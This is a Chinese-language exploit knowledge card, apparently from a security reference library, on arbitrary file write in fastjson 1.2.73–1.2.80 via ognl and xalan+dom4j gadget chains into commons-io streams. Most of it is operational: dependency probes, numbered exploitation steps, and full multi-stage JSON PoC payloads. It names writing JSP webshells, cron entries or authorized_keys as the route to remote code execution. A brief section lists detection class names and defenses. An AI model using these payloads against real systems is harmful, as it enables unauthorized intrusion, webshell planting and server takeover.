---
id: web-java-deser-fastjson-1280-ognl-xalan-commonsio-file-write
title: Fastjson 1.2.73-1.2.80 任意文件写入：ognl 与 xalan+dom4j 桥接 commons-io TeeInputStream/WriterOutputStream 写目标文件
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-ognl-xalan-commonsio-file-write
aliases:
- fastjson 1.2.80 写文件
- fastjson ognl 写文件
- fastjson xalan 写文件
- TeeInputStream WriterOutputStream
- FileWriterWithEncoding fastjson
- fastjson 写 JSP
tags:
- java
- fastjson
- deserialization
- file-write
- ognl
- xalan
- dom4j
- commons-io
- webshell
cve: []
severity: critical
confidence: medium
affected_versions: fastjson 1.2.73 <= version <= 1.2.80（原文标注；需 commons-io 2.x，ognl 链需 ognl，xalan 链需 xalan>=2.4.0 + dom4j）
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V583
  verified_at: '2026-11-12T12:42:26+08:00'
  notes: 已对照原文核对：原文5.2/5.3明确1.2.73<=version<=1.2.80；ognl与xalan+dom4j两链payload、$ref结构、8192长度限制与原文一致；写入成功截图均为外链未随文章下载，无法二次确认结果，confidence medium合理；已修正字段说明为is/inputStream、encoding/charsetName；与1268/1280既有写链非同链；affected_versions保留原文标注。
---

## 一句话结论

在 fastjson 1.2.73~1.2.80、classpath 有 commons-io 2.x 时（ognl 链还需 ognl，xalan 链还需 xalan>=2.4.0 与 dom4j），可用 `ognl.OgnlException` 的 `Evaluation` 或 xalan 的 `DTMConfigurationException` + dom4j `XMLWriter` 持有 commons-io 的 `TeeInputStream`/`WriterOutputStream` 对象图，把攻击者可控的 `CharSequence`（如 JSP 代码）写入任意可写路径；内容需大于 8192 字节（2.0~2.6 版本实际写入前 8192 字符，2.7~2.8 用 `start/end` 控制范围）。

## 原理

- **共同的 sink**：commons-io 的 `ReaderInputStream` 把 `CharSequenceReader` 中的字符转成字节流，`TeeInputStream` 在读取时把字节复制到 `branch`，`WriterOutputStream` 再把字节解码写入 `FileWriterWithEncoding` 指向的文件。只要对象图被构造并在反序列化/读取时执行一次读取，写入就发生。
- **ognl 链（1.2.73~1.2.80）**：先用 `{"@type":"java.lang.Exception","@type":"ognl.OgnlException"}` 把 ognl 异常/`Evaluation`/`OgnlParser` 相关类型压入 fastjson 的反序列化器缓存；再用 `ognl.Evaluation` 的 `node`（`ASTMethod`）→ `p`（`OgnlParser`）→ `stream`（`BOMInputStream`）承载 `ReaderInputStream`+`TeeInputStream`，多个 `Evaluation` 交叉引用 `$ref` 强制读取，最终把 `CharSequenceReader` 的内容写到 `FileWriterWithEncoding`。
- **xalan+dom4j 链（1.2.73~1.2.80）**：用 `java.lang.Exception` + `org.apache.xml.dtm.DTMConfigurationException`（字段 `locator` 类型 `SourceLocator`）预热缓存；再构造 `XNodeSetForDOM`/`NodeSet`/`XPathContext`/`XMLWriter`/`SAXContentHandler` 对象图，把 `InputStream`（commons-io 链）接到 xalan 的 `byteStream`；分四步发送，中间报错可忽略，最终由 XMLWriter/TeeInputStream 触发写入。
- **为什么两步/多步**：fastjson 1.2.80 的 AutoType 黑名单会拦住直接加载这些类，必须先用期望类（Exception/Throwable 子类）把目标类型及其字段类型塞进 `ParserConfig` 的反序列化器缓存，后续请求命中缓存后不再被黑名单检查。
- **内容长度**：commons-io 2.0~2.6 的 `ReaderInputStream`/`XmlStreamReader` 组合会按内部缓冲区（8192）处理，写入内容需大于 8192 字节且实际只写前 8192 字符；2.7~2.8 通过 `CharSequenceReader` 的 `start:0,end:2147483647` 与 `XmlStreamReader.inputStream` 字段名适配，写入完整内容。
- **为什么能 getshell**：把 JSP/`.jsp` 文件写入 Tomcat 等容器可解析的 Web 目录，访问即执行；也可写 cron/authorized_keys 等（见任意文件写转 RCE 卡）。

## 触发条件

- fastjson 1.2.73 <= version <= 1.2.80，SafeMode 关闭。
- classpath 有 commons-io 2.x；ognl 链需 ognl，xalan 链需 xalan>=2.4.0 + dom4j。
- 目标路径对应用进程可写；Web 目录可被容器解析（写 JSP 时）。
- 攻击者能发送多段 JSON 并观察响应/报错（中间步骤报错不影响最终写入）。

## 利用步骤

1. 确认版本与依赖：`{"@type":"java.lang.Character"{"@type":"java.lang.Class","val":"org.apache.commons.io.input.TeeInputStream"}}` 等报错/响应判断 commons-io；`ognl.OgnlException`/`org.apache.xml.dtm.DTMConfigurationException` 判断 ognl/xalan。
2. 选择链与版本适配：
   - commons-io 2.0~2.6：`XmlStreamReader.is`、`FileWriterWithEncoding.encoding`；2.7~2.8：`XmlStreamReader.inputStream`、`FileWriterWithEncoding.charsetName`，`CharSequenceReader` 增加 `start/end`。
   - ognl 链：多段 `su14`~`su19` 的 `Evaluation` 对象图；xalan 链：4 段（异常、类缓存、XNodeSetForDOM、InputStream 链）。
3. 准备写入内容：JSP/命令代码前面补足到 >8192 字节（2.0~2.6），并把 `FileWriterWithEncoding.file` 指向目标 Web 目录。
4. 依次发送各段 payload；中间段可能返回 500/解析报错，属正常；最后一段触发 `TeeInputStream` 读取并把内容写入文件。
5. 访问写入的 JSP/脚本文件确认执行；或写入 cron/authorized_keys/jar 等按落地位置继续利用。

## PoC

```json
// 段落一：预置 ognl 异常期望类（ognl 链）
{"su14":{"@type":"java.lang.Exception","@type":"ognl.OgnlException"}}
```

```json
// 段落二：ognl 链核心（commons-io 2.0~2.6；content 需 >8192 字符，file 为写入路径）
{"su15":{"@type":"java.lang.Class","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"ognl.OgnlException","_evaluation":""}},"su16":{"@type":"ognl.Evaluation","node":{"@type":"ognl.ASTMethod","p":{"@type":"ognl.OgnlParser","stream":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.XmlStreamReader","is":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.CharSequenceReader","charSequence":{"@type":"java.lang.String""<CONTENT>"},"charsetName":"UTF-8","bufferSize":1024},"branch":{"@type":"org.apache.commons.io.output.WriterOutputStream","writer":{"@type":"org.apache.commons.io.output.FileWriterWithEncoding","file":"<TARGET_PATH>","encoding":"UTF-8","append":false},"charsetName":"UTF-8","bufferSize":1024,"writeImmediately":true},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36,82]}]}}}},"su17":{"$ref":"$.su16"},...}
```

```json
// xalan 链四段（2.0~2.6 结构；后三段与前段交叉 $ref）
{"@type":"java.lang.Exception","@type":"org.apache.xml.dtm.DTMConfigurationException","locator":{}}
{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.apache.xml.dtm.DTMConfigurationException","locator":{}}}}
{"su14":{"@type":"javax.xml.transform.SourceLocator","@type":"org.apache.xpath.objects.XNodeSetForDOM","nodeIter":{"@type":"org.apache.xpath.NodeSet"},"xctxt":{"@type":"org.apache.xpath.XPathContext","primaryReader":{"@type":"org.dom4j.io.XMLWriter","entityResolver":{"@type":"org.dom4j.io.SAXContentHandler","inputSource":{"byteStream":{"@type":"java.io.InputStream"}}}}}}}
{"su16":{"@type":"java.io.InputStream","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.XmlStreamReader","is":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.CharSequenceReader","charSequence":{"@type":"java.lang.String""<CONTENT>"},"charsetName":"UTF-8","bufferSize":1024},"branch":{"@type":"org.apache.commons.io.output.WriterOutputStream","writer":{"@type":"org.apache.commons.io.output.FileWriterWithEncoding","file":"<TARGET_PATH>","encoding":"UTF-8","append":false},"charsetName":"UTF-8","bufferSize":1024,"writeImmediately":true},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36,82]}]}}
```

## 变体与关联

- 变体：commons-io 2.7~2.8 把 `XmlStreamReader` 的 `is` 改成 `inputStream`、`CharSequenceReader` 增加 `start:0`/`end:2147483647`；ognl 段用相同的 `$ref` 结构调整。
- 变体：1.2.68 用 `java.lang.AutoCloseable` 期望类即可走同类 commons-io 写链（见关联卡）；1.2.80 还可用 Jackson `JsonGenerator` + `MarshalOutputStream` 链写文件。
- 关联：[[web-java-deser-fastjson-1268-autocloseable-expectclass-file-rw]]（1.2.68 AutoCloseable commons-io 读写）、[[web-java-deser-fastjson-1280-outputstream-cache-file-write]]（1.2.80 Jackson+MarshalOutputStream 写文件）、[[web-java-deser-fastjson-file-write-to-rce]]（写文件转 RCE 落地）、[[web-java-deser-fastjson-1280-aspectjtools-file-read]]（同版本段的文件读取链）。
- 边界：fastjson 不在 1.2.73~1.2.80、SafeMode 开启、无 commons-io/ognl/xalan/dom4j 依赖、目标目录不可写、内容未达 8192 字节（2.0~2.6）时失效。

## 检测与防御

- 检测：JSON 中出现 `ognl.OgnlException`、`ognl.Evaluation`、`org.apache.xml.dtm.DTMConfigurationException`、`XNodeSetForDOM`、`TeeInputStream`、`WriterOutputStream`、`FileWriterWithEncoding` 等类名；Web 目录出现新脚本文件；应用进程异常写文件。
- 防御：升级 fastjson 并开启 SafeMode/关闭 AutoType；移除不必要的 ognl/xalan/dom4j/commons-io 依赖；Web 目录禁止脚本写入或关闭解析；配置 `jdk.serialFilter` 与文件完整性监控；对上传/写入路径做白名单。
